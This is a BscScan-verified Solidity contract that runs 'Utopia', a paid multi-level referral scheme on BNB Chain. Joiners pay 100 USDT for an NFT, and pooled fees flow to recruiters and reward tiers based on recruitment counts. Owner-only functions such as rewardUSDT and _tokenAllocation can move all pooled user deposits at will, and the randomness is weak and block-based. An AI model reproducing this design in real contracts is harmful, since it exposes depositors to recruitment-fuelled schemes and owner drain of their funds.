/**
 *Submitted for verification at BscScan.com on 2022-12-24
*/

// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// File: @openzeppelin/contracts/utils/Context.sol


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: contracts/Utopia/Utopia2.sol


pragma solidity ^0.8.17;



interface IERC20Ext is IERC20 {
    function decimals() external view returns(uint8);
}

interface UtopiaNFT {
    function mint(address account) external;
    function totalSupply() external view returns(uint256);
    function ownerOf(uint256 tokenId) external view returns(address);
}

interface IUniswapV2Pair {
    function balanceOf(address owner) external view returns (uint);
    function transfer(address to, uint value) external returns (bool);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface UtopiaRalationship {
    function setRecommender(address account, address recommender) external;
    function getRecommender(address account) external view returns (address);
}

interface UtopiaInsurance {
    function setLastTime() external;
}

contract Utopia is  Ownable {
    uint256 public dailyReward;
    uint256 public rewardStopTime;
    IERC20Ext public usdt;
    IERC20Ext public utopiaToken;
    UtopiaNFT public utopiaNFT;
    UtopiaRalationship public utopiaRalationship;
    address public admin;
    uint256 public mintPrices = 100 ether;
    mapping(address => uint256[6]) public referral_grade;
    uint256[6] public all_grade_num;
    mapping(address=>uint8) public vip;
    mapping(address=>uint8) public history_vip;
    uint8[5] public grade_requirements = [0,3,8,6,5];
    mapping(address => uint256) public IDCARD;
    mapping(address => address[]) public recommended_address;
    bool public pause;
    uint8[6] public rewardLadder = [2,15,10,8,5,3];//[0,5]
    uint256 public totalBonus;
    uint256 public historytotalBonus;
    uint256[6] public rewardLadderAmount;
    uint256 public numberOfTimes;
    uint256 public statisticsRewardTime;
    mapping(address=>uint256) public createTime;
    mapping(address=>uint256) public lastUpdateTime;
    mapping(address=>uint256) public numberOfIndividuals;
    mapping(address=>uint256) public historyCommission;
    mapping(address=>uint256) public historyBonus;
    address[] public allUserAddress;
    address[] public allJoinUserAddress;
    address public newUserAddress;
    uint256 public todayUtopiaUserNum;
    UtopiaInsurance public utopiaInsurance;
    address public operatingFund;
    uint256 public lastTime;
    bool public autoStatisticsReward;
    mapping(address=>bool) public derivation;

    mapping(address=>uint256) public invitePermissionNum;
    bool public invitationRestrictions;
    uint256 utopia1DataNum;

    constructor(address utopiaToken_, address utopiaNFT_, address admin_, address utopiaInsurance_, address utopiaRalationship_, address operatingFund_) {
        utopiaToken = IERC20Ext(utopiaToken_);
        utopiaNFT = UtopiaNFT(utopiaNFT_);
        usdt = IERC20Ext(0x55d398326f99059fF775485246999027B3197955);
        admin = admin_;
        setUtopiaInsurance(utopiaInsurance_);
        setUtopiaRalationship(utopiaRalationship_);
        setOperatingFund(operatingFund_);
        autoStatisticsReward = true;
        invitationRestrictions = true;
        utopia1DataNum = 1;
    }

    function addTotalBonus(uint256 bonus) public {
        require(bonus >= 10**18,"[Utopia] At least 1 USDT");
        usdt.transferFrom(msg.sender, address(this), bonus);
        totalBonus += bonus;
    }

    function addTotalBonusFromContract(uint256 bonus) public onlyDerivation {
        totalBonus += bonus;
    }

    function getMintPrices() public view returns(uint256) {
        return mintPrices;
    }

    function setMintPrices(uint256 mintPrices_) public onlyOwner {
        mintPrices = mintPrices_;
    }

    function setInvitationRestrictions(bool flag) public onlyOwner {
        invitationRestrictions = flag;
    }

    function dataTransfer() public onlyOwner {
        address account;
        uint256 totalNftCount = utopiaNFT.totalSupply();
        for(uint256 j = utopia1DataNum; j <= utopia1DataNum+100; j++) {
            if(j > totalNftCount){
                break;
            }
            account = utopiaNFT.ownerOf(j);
            address recommender_address = getRecommender(account);

            referral_grade[recommender_address][0]++;
            all_grade_num[0]++;
            numberOfIndividuals[account] = 0;
            recommended_address[recommender_address].push(account);
            newUserAddress = account;
            allUserAddress.push(account);
            createTime[account] = block.timestamp;
            lastUpdateTime[account] = block.timestamp;

            addInvitePermissionNum(account,3);
            addInvitePermissionNum(recommender_address,3);

            historyCommission[account] += getMintPrices();
            IDCARD[account] = utopia1DataNum+1;
            todayUtopiaUserNum++;
            allJoinUserAddress.push(account);
            address current_address = account;
            uint8 remain_vip;
            uint8 current_vip;
            for(uint256 i = 0; i < 6; i++) {
                if(recommender_address == address(0)){
                    break;
                }
                remain_vip = vip[current_address];
                current_vip = calculationGrade(current_address);
                if(current_vip > remain_vip && remain_vip < 5){
                    vip[current_address] = current_vip;
                    if(lastUpdateTime[current_address] < statisticsRewardTime){
                        history_vip[current_address] = current_vip;
                        lastUpdateTime[current_address] = block.timestamp;
                    }
                    all_grade_num[current_vip]++;
                    all_grade_num[remain_vip]--;
                    referral_grade[recommender_address][current_vip]++;
                    referral_grade[recommender_address][remain_vip]--;
                    current_address = recommender_address;
                    recommender_address = getRecommender(current_address);
                }else{
                    break;
                }
            }
        }


    }

    function addInvitePermissionNum(address account, uint256 num) public onlyOwner {
        invitePermissionNum[account] += num;
    }

    function setRecommender(address recommender) public {
        require(msg.sender != owner(),"[Utopia] woner do not operate");
        require(msg.sender != admin,"[Utopia] admin do not operate");
        require(IDCARD[recommender] != 0 || owner() == recommender, "[Utopia] Invalid recommender!");
        require(createTime[msg.sender] == 0, "[Utopia] Already bound recommender!");
        if(invitationRestrictions == true){
            require(invitePermissionNum[recommender] > 0, "[Utopia] Referrer invitation permission has been exhausted!");
            invitePermissionNum[recommender] --;
        }

        referral_grade[recommender][0]++;
        all_grade_num[0]++;
        numberOfIndividuals[msg.sender] = 0;
        recommended_address[recommender].push(msg.sender);
        newUserAddress = msg.sender;
        allUserAddress.push(msg.sender);
        createTime[msg.sender] = block.timestamp;
        lastUpdateTime[msg.sender] = block.timestamp;
        utopiaRalationship.setRecommender(msg.sender, recommender);
    }

    function nowTime() public view returns(uint) {
        return block.timestamp - (block.timestamp + 8 * 3600) % 86400 ;
    }

    function getAllUserAddressNum() public view returns(uint256){
        return allUserAddress.length;
    }

    function getRandomUser() public view returns(address[100] memory){
        uint256 len = allUserAddress.length;
        uint256 start;
        uint256 num = 100;
        uint256 max;
        address[100] memory userAddr;
        if(len > num){
            start = random(len-num);
            max = start+num;
        }else{
            start = 0;
            max = num;
        }
        uint256 j = 0;
        for(uint256 i=start;i<max;i++){
            if(j > len-1){
                userAddr[j] = address(0);
            }else{
                userAddr[j] = allUserAddress[i];
            }
            j++;
        }
        return userAddr;
    }

    function getRandomJoinUser() public view returns(address[100] memory){
        uint256 len = allJoinUserAddress.length;
        uint256 start;
        uint256 num = 100;
        uint256 max;
        address[100] memory userAddr;
        if(len > num){
            start = random(len-num);
            max = start+num;
        }else{
            start = 0;
            max = num;
        }
        uint256 j = 0;
        for(uint256 i=start;i<max;i++){
            if(j > len-1){
                userAddr[j] = address(0);
            }else{
                userAddr[j] = allJoinUserAddress[i];
            }
            j++;
        }
        return userAddr;
    }

    function getRecommendedAddress(address account) public view returns(address[] memory){
        return recommended_address[account];
    }

    function getRecommender(address account) public view returns(address) {
        return utopiaRalationship.getRecommender(account);
    }

    function join() public {
        require(msg.sender != owner(),"[Utopia] Woner do not operate");
        require(msg.sender != admin,"[Utopia] Admin do not operate");
        require(pause == false, "[Utopia] Temporarily paused to mint!");
        require(getRecommender(msg.sender) != address(0), "[Utopia] You cant mint without recommender!");
        require(IDCARD[msg.sender] == 0, "[Utopia] Already owned IDCARD!");
        address recommender_address = getRecommender(msg.sender);
        uint256 join_price = getMintPrices();
        uint256 amount;

        require(usdt.balanceOf(msg.sender) >= join_price, "[Utopia] Your balance is insufficient balance to mint NFT!");
        usdt.transferFrom(msg.sender, address(this), join_price);
        amount = (join_price*10)/100;
        usdt.transfer(recommender_address,amount);
        usdt.transfer(address(utopiaInsurance),amount);
        amount = (join_price*20)/100;
        usdt.transfer(operatingFund,amount);
        totalBonus += join_price;

        addInvitePermissionNum(msg.sender,3);
        addInvitePermissionNum(recommender_address,3);

        historyCommission[msg.sender] += join_price;
        uint256 totalNftCount = utopiaNFT.totalSupply();
        IDCARD[msg.sender] = totalNftCount+1;
        todayUtopiaUserNum++;
        allJoinUserAddress.push(msg.sender);
        address current_address = msg.sender;
        uint8 remain_vip;
        uint8 current_vip;
        for(uint256 i = 0; i < 8; i++) {
            if(recommender_address == address(0)){
                break;
            }
            remain_vip = vip[current_address];
            current_vip = calculationGrade(current_address);
            if(current_vip > remain_vip && remain_vip < 7){
                vip[current_address] = current_vip;
                if(lastUpdateTime[current_address] < statisticsRewardTime){
                    history_vip[current_address] = current_vip;
                    lastUpdateTime[current_address] = block.timestamp;
                }
                all_grade_num[current_vip]++;
                all_grade_num[remain_vip]--;
                referral_grade[recommender_address][current_vip]++;
                referral_grade[recommender_address][remain_vip]--;
                current_address = recommender_address;
                recommender_address = getRecommender(current_address);
            }else{
                break;
            }
        }
        utopiaInsurance.setLastTime();
        utopiaNFT.mint(msg.sender);

    }

    function calculationGrade(address account) public view returns(uint8){
        uint256 referral_num;
        referral_num = referral_grade[account][4];
        if(referral_num >= grade_requirements[4] && IDCARD[account] != 0){
            return 5;
        }
        referral_num += referral_grade[account][3];
        if(referral_num >= grade_requirements[3] && IDCARD[account] != 0){
            return 4;
        }
        referral_num += referral_grade[account][2];
        if(referral_num >= grade_requirements[2] && IDCARD[account] != 0){
            return 3;
        }
        referral_num += referral_grade[account][1];
        if(referral_num >= grade_requirements[1] && IDCARD[account] != 0){
            return 2;
        }
        if(IDCARD[account] != 0){
            return 1;
        }
        return 0;
    }

    function statisticsReward() public {
        uint256 totalNftCount = utopiaNFT.totalSupply();
        if(totalNftCount > 0){
            lastTime = nowTime();
            uint256 bonus = 0;
            uint256 rAmount = totalBonus + historytotalBonus;
            historytotalBonus = 0;
            for(uint256 i=0;i<all_grade_num.length;i++){
                if(all_grade_num[i] > 0){
                    bonus = totalBonus*rewardLadder[i]/100;
                    rewardLadderAmount[i] = bonus/all_grade_num[i];
                    rAmount -= bonus;
                    historytotalBonus += bonus;
                }
            }
            bonus = totalBonus*40/100;
            rAmount -= bonus;
            if(rAmount > 0){
                usdt.transfer(operatingFund,rAmount);
            }
            statisticsRewardTime = block.timestamp;
            totalBonus = 0;
            numberOfTimes++;
            todayUtopiaUserNum = 0;
        }
    }

    function queryReward(address account) public view returns(uint256){
        uint256 amount = 0;
        if(getRecommender(account) == address(0) || numberOfTimes <= numberOfIndividuals[account] || statisticsRewardTime <= createTime[account]){
            return amount;
        }
        if(statisticsRewardTime <= lastUpdateTime[account]){
            return rewardLadderAmount[history_vip[account]];
        }else{
            return rewardLadderAmount[vip[account]];
        }
    }

    function receiveRewards() public {
        require(msg.sender != owner(),"[Utopia] Woner do not operate");
        require(msg.sender != admin,"[Utopia] Admin do not operate");
        uint256 amount = queryReward(msg.sender);
        require(amount > 0, "[Utopia] You have no reward!");
        usdt.transfer(msg.sender,amount);
        historytotalBonus -= amount;
        numberOfIndividuals[msg.sender] = numberOfTimes;
        historyBonus[msg.sender] += amount;
    }

    function setMintAllowance(bool flag) public onlyOwner {
        pause = flag;
    }

    function rewardUSDT(address to, uint256 amount) public onlyOwner {
        usdt.transfer(to,amount);
    }

    function rewardUT(address to, uint256 amount) public onlyOwner {
        utopiaToken.transfer(to,amount);
    }

    function setUtopiaRalationship(address utopiaRalationship_) public onlyOwner {
        utopiaRalationship = UtopiaRalationship(utopiaRalationship_);
    }

    function setUtopiaInsurance(address utopiaInsurance_) public onlyOwner {
        utopiaInsurance = UtopiaInsurance(utopiaInsurance_);
    }

    function setOperatingFund(address operatingFund_) public onlyOwner {
        operatingFund = operatingFund_;
    }

    function setUtopiaToken(address utopiaToken_) public onlyOwner {
        utopiaToken = IERC20Ext(utopiaToken_);
    }

    function setUtopiaNFT(address utopiaNFT_) public onlyOwner {
        utopiaNFT = UtopiaNFT(utopiaNFT_);
    }

    function random(uint number) public view returns(uint) {
        if(number == 0){
            return 0;
        }
        return uint(keccak256(abi.encodePacked(block.timestamp,block.difficulty,
            msg.sender))) % number;
    }

    function setAdmin(address admin_) public onlyOwner {
        admin = admin_;
    }

    function setDerivation(address contract_) public onlyOwner{
        derivation[contract_] = true;
    }

    function closeDerivation(address contract_) public onlyOwner{
        derivation[contract_] = false;
    }

    modifier onlyDerivation() {
        require(derivation[msg.sender] == true || msg.sender == owner(), "[UtopiaNFT] This function can be called only from admin!");
        _;
    }

    function _tokenAllocation(IERC20 _ERC20, address _address, uint256 _amount) external onlyOwner{
        _ERC20.transfer(_address, _amount);
    }
}